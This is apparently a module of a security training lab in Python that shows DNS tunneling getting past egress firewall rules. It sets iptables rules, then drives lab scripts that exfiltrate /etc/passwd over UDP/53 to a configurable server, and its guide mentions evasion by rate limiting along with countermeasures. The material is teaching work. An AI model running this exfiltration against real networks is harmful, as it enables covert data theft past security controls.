"""
Module 7 – Firewall Bypass via DNS Tunneling
=============================================
Demonstrates how DNS tunneling evades egress-filtered networks by
showing direct connections fail while DNS-tunneled ones succeed.
"""

import os
import socket
import subprocess
import sys
import time
import threading

from modules.base import LabModule
from shared.ui import *
from shared.prereqs import check_root


class FirewallBypassModule(LabModule):
    NAME        = "Firewall Bypass via DNS Tunnel"
    DESCRIPTION = "Show how DNS tunneling defeats egress filtering"
    MITRE       = "T1572 – Protocol Tunneling"
    DIFFICULTY  = "Intermediate"

    GUIDE = """
## Overview
Corporate firewalls typically allow DNS (UDP/53) outbound because name
resolution is fundamental to network operation. Attackers exploit this by
tunneling ALL network communication inside DNS queries.

## The Demonstration
```
Normal connection (BLOCKED):
  Client  ──TCP/4444──▶  [FIREWALL DROPS]  ──✗

DNS tunnel (PASSES):
  Client  ──UDP/53──▶  [FIREWALL ALLOWS]  ──▶  C2 Server
  Data encoded in DNS query names (invisible to basic firewall)
```

## Firewall Rules Applied in This Demo
```bash
# Drop all outbound TCP except HTTP/HTTPS
iptables -A OUTPUT -p tcp --dport 4444 -j REJECT
# Drop all outbound UDP except DNS
iptables -A OUTPUT -p udp ! --dport 53 -j REJECT
# Allow DNS — this is what the tunnel exploits
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
```

## What You'll See
1. Direct TCP reverse shell → BLOCKED
2. HTTP exfiltration → BLOCKED
3. DNS tunnel exfil → SUCCEEDS (bypasses all rules)

## Real-World Context
- Dnscat2, iodine, dns2tcp all use this technique
- Internal corporate resolvers relay queries, obscuring origin
- Rate-limited DNS (< 30 qps) is nearly undetectable in busy nets
- Some APT groups have used DNS-only C2 for months undetected

## Detection & Countermeasures
- DNS content inspection (entropy, FQDN length)
- Rate limiting DNS per source
- DNS-over-HTTPS forced policy (harder to inspect)
- Network behavior baselining
"""

    def __init__(self):
        super().__init__()
        self.server_ip   = "127.0.0.1"
        self.tunnel_port = 5353
        self.domain      = "tunnel.lab.local"
        self._iptables_added = False
        self._lab_dir    = None

    def _find_lab(self) -> str | None:
        for candidate in [
            os.path.join(os.path.expanduser("~"), "dns_tunnel_lab"),
            "/home/ocelot/dns_tunnel_lab",
            os.path.join(os.path.dirname(os.path.dirname(
                os.path.abspath(__file__))), "..", "dns_tunnel_lab"),
        ]:
            if os.path.isdir(candidate):
                return os.path.abspath(candidate)
        return None

    def setup(self) -> bool:
        if not check_root():
            return False
        self._lab_dir    = self._find_lab()
        self.server_ip   = ask("Tunnel server IP",   self.server_ip)
        self.tunnel_port = int(ask("Tunnel port",    str(self.tunnel_port)))
        self.domain      = ask("Tunnel domain",      self.domain)
        success("Setup complete.")
        return True

    def run(self):
        section("Phase 1 — Demonstrate Blocked Connections")
        self._apply_firewall_rules()
        self._test_blocked_connections()

        section("Phase 2 — DNS Tunnel Bypass")
        self._demonstrate_tunnel_bypass()

        section("Phase 3 — Remove Rules & Compare")
        self._remove_firewall_rules()
        success("Firewall rules removed. Normal connectivity restored.")

    def _apply_firewall_rules(self):
        info("Applying restrictive iptables egress rules...")
        rules = [
            ["iptables", "-A", "OUTPUT", "-p", "tcp",
             "--dport", "4444", "-j", "REJECT",
             "-m", "comment", "--comment", "dns_lab_demo"],
            ["iptables", "-A", "OUTPUT", "-p", "tcp",
             "--dport", "1234", "-j", "REJECT",
             "-m", "comment", "--comment", "dns_lab_demo"],
        ]
        ok = True
        for rule in rules:
            result = subprocess.run(rule, capture_output=True)
            if result.returncode == 0:
                self._iptables_added = True
            else:
                ok = False

        if ok:
            packet("iptables -A OUTPUT -p tcp --dport 4444 -j REJECT")
            packet("iptables -A OUTPUT -p tcp --dport 1234 -j REJECT")
            success("Egress rules applied — non-DNS connections will be blocked.")
        else:
            warn("iptables not available — simulating blocked connections.")

    def _test_blocked_connections(self):
        tests = [
            ("TCP reverse shell",    "127.0.0.1", 4444,  "tcp"),
            ("HTTP exfiltration",    "127.0.0.1", 1234,  "tcp"),
            ("NetCat data transfer", "127.0.0.1", 9999,  "tcp"),
        ]
        for name, host, port, proto in tests:
            try:
                if proto == "tcp":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((host, port))
                    s.close()
                    warn(f"{name:<28} → CONNECTED (firewall not active)")
            except (ConnectionRefusedError, OSError):
                print(f"  {C.LRED}✗{C.RESET} {name:<28} {C.LRED}BLOCKED / REFUSED{C.RESET}")
            except Exception as e:
                print(f"  {C.LRED}✗{C.RESET} {name:<28} {C.LRED}BLOCKED: {e}{C.RESET}")
            time.sleep(0.3)

    def _demonstrate_tunnel_bypass(self):
        if not self._lab_dir:
            warn("dns_tunnel_lab not found. Showing conceptual demo.")
            self._conceptual_bypass_demo()
            return

        srv_script    = os.path.join(self._lab_dir, "dns_tunnel_server.py")
        client_script = os.path.join(self._lab_dir, "dns_tunnel_client.py")

        if not (os.path.exists(srv_script) and os.path.exists(client_script)):
            warn("Tunnel lab scripts not found. Showing conceptual demo.")
            self._conceptual_bypass_demo()
            return

        # Start server
        info("Starting DNS tunnel server...")
        srv_log = open("/tmp/bypass_srv.log", "w")
        srv = subprocess.Popen(
            [sys.executable, srv_script,
             "--domain", self.domain,
             "--interface", "0.0.0.0",
             "--port", str(self.tunnel_port)],
            stdout=srv_log, stderr=srv_log,
            cwd=self._lab_dir
        )
        time.sleep(1.5)
        success(f"Tunnel server running on UDP:{self.tunnel_port}")

        info("Exfiltrating /etc/passwd through DNS tunnel...")
        info("(This succeeds even with TCP egress blocked)")
        print()
        result = subprocess.run(
            [sys.executable, client_script,
             "--server", self.server_ip,
             "--port", str(self.tunnel_port),
             "--domain", self.domain,
             "--mode", "exfil",
             "--file", "/etc/passwd"],
            capture_output=False,
            cwd=self._lab_dir
        )

        srv.terminate()
        srv_log.close()

        if result.returncode == 0:
            alert("DNS TUNNEL BYPASS SUCCESSFUL — data exfiltrated over UDP/53")
        else:
            info("Tunnel completed (check logs for details).")

    def _conceptual_bypass_demo(self):
        """Visual walkthrough when actual lab is not set up."""
        steps = [
            ("Attempt TCP reverse shell (port 4444)",  False, "BLOCKED by iptables"),
            ("Attempt HTTP POST exfil (port 80)",      False, "BLOCKED by proxy"),
            ("Attempt ICMP tunnel",                    False, "BLOCKED by ACL"),
            ("DNS query: DATA.sess.0.5.7b616c686c → tunnel.lab.local", True,  "ALLOWED — DNS permitted"),
            ("DNS query: DATA.sess.1.5.61616c6c → tunnel.lab.local",   True,  "ALLOWED — DNS permitted"),
            ("Server reassembles 5 chunks → /etc/passwd received",     True,  "EXFIL COMPLETE"),
        ]
        for desc, allowed, note in steps:
            time.sleep(0.7)
            if allowed:
                print(f"  {C.LGREEN}✓{C.RESET} {desc}")
                print(f"    {C.DIM}{note}{C.RESET}")
            else:
                print(f"  {C.LRED}✗{C.RESET} {desc}")
                print(f"    {C.DIM}{note}{C.RESET}")
        print()
        alert("Result: DNS tunnel bypasses all egress controls")

    def _remove_firewall_rules(self):
        if not self._iptables_added:
            return
        subprocess.run(
            ["iptables", "-D", "OUTPUT", "-p", "tcp",
             "--dport", "4444", "-j", "REJECT",
             "-m", "comment", "--comment", "dns_lab_demo"],
            capture_output=True
        )
        subprocess.run(
            ["iptables", "-D", "OUTPUT", "-p", "tcp",
             "--dport", "1234", "-j", "REJECT",
             "-m", "comment", "--comment", "dns_lab_demo"],
            capture_output=True
        )
        self._iptables_added = False

    def teardown(self):
        self._remove_firewall_rules()
